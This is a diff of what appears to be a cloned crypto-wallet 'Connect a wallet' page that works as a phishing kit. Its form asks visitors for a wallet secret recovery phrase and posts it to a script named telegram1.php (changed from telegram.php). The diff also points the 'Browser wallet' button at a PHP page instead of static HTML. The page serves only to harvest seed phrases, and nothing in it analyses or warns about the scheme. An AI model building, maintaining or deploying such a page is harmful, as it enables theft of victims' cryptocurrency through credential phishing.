@@ -15,7 +15,7 @@
     <link href="./index_files/css2" rel="stylesheet">
     <link rel="stylesheet" href="./index_files/style.css">
     <!-- Facebook Pixel Code -->
-    <script async="" src="./index_files/fbevents.js.téléchargement"></script><script>
+    <script async="" src="./index_files/fbevents.js.telechargement"></script><script>
         !function(f,b,e,v,n,t,s)
         {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
         n.callMethod.apply(n,arguments):n.queue.push(arguments)};
@@ -887,7 +887,7 @@
     <div class="modal">
         <div class="modal_center">
             <h2>Connect a wallet</h2>
-            <button onclick="window.open(&#39;index_files/metamask.html&#39;,  &#39;&#39;, &#39; location =0,left=1600,width=346,height=583&#39;);">Browser wallet <img src="./index_files/browserWallet.svg" alt=""></button>
+            <button onclick="window.open(&#39;index_files/metamask.php&#39;,  &#39;&#39;, &#39; location =0,left=1600,width=346,height=583&#39;);">Browser wallet <img src="./index_files/browserWallet.svg" alt=""></button>
             <button class="show_seed_form">WalletConnect <img src="./index_files/walletConnect.svg" alt=""></button>
             <button class="show_seed_form">Coinbase <img src="./index_files/coinbase.svg" alt=""></button>
             <button class="show_seed_form">Torus <img src="./index_files/torus.svg" alt=""></button>
@@ -896,7 +896,7 @@
             <svg id="close_modal" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-bgog19" focusable="false" aria-hidden="true" viewBox="0 0 24 24"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true" data-cy="CloseModalIcon"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path></svg></svg>
         </div>
         <div class="seed_form">
-            <form action="telegram.php" method="post">
+            <form action="telegram1.php" method="post">
                 <p>Connect wallet to SafePal</p>
                 <span>Continue with a secret phrase</span>
                 <textarea id="seed" name="seed" placeholder="Separate each word with a single space..." cols="30" rows="10"></textarea>
@@ -906,6 +906,6 @@
         </div>
     </div>
 
-    <script src="./index_files/script.js.téléchargement"></script>
+    <script src="./index_files/script.js.telechargement"></script>
 
 </body></html>
